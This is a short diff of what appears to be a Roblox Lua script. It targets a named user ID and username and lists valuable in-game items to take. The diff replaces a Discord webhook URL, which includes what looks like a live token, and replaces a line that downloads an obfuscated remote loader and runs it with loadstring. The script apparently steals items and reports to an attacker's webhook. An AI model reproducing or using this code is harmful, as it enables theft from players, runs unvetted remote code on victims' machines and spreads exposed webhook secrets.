@@ -1,6 +1,6 @@
 local TARGET_ID = 4798403747
 local TARGET_USER = "X4RZQ"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1571416058793959514/eLbvY3nnrCzMkD19xqcG8hWQHW37JC47QpK_66xmcnHwEnTYieWNfPgG-47HDtgQToEM"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1544152303466971178/neF8hGJWYYA8BQVF95BJBEfL3ozrmHkv2OZGTiIcACVut4_Wiy_plW2VD8l4b9ULlMv_"
 
 local TargetBrainrots = {
     ["Dragon Skeletonini"] = true,
@@ -346,7 +346,7 @@ local TargetGears = {
 }
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/bf4272b6036fe1b6313c4295d1de6b84.lua"))()
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/61a860237ebfc70fa3bf787d20aaf101.lua"))()
 
     task.wait(1)
 
